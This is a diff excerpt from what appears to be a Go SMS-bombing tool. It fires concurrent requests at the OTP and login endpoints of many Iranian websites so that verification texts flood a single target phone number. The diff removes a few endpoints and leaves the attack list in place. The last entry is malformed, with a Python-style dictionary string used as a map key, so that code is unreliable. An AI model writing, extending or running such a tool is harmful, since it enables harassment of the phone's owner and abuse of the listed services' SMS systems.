@@ -219,9 +219,6 @@ func main() {
 		go sms("https://digitalsignup.snapp.ir/ds3/api/v3/otp?utm_source=snapp.ir&utm_medium=website-button&utm_campaign=menu&cellphone=", map[string]interface{}{
 			"cellphone": phone,
 		}, ch)   // add site
-		go sms("https://api.ostadkr.com/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)   // add site
 		go sms("https://drdr.ir/api/v3/auth/login/mobile/init", map[string]interface{}{
 			"mobile": phone,
 		}, ch)    // add site
@@ -423,12 +420,6 @@ func main() {
 		}, ch) // just check
 		go sms("https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
 			"UserName": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://ssr.anargift.com/api/v1/auth", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // edit :4/22/2025
-		go sms("https://ssr.anargift.com/api/v1/auth/send_code", map[string]interface{}{
-			"mobile": phone,
 		}, ch)  // edit :4/22/2025
 		go sms("https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
 			"'Parameters': {'ApplicationType': 'Web','ApplicationUniqueToken': None, 'ApplicationVersion': '1.0.0','MobileNumber': +": phone,
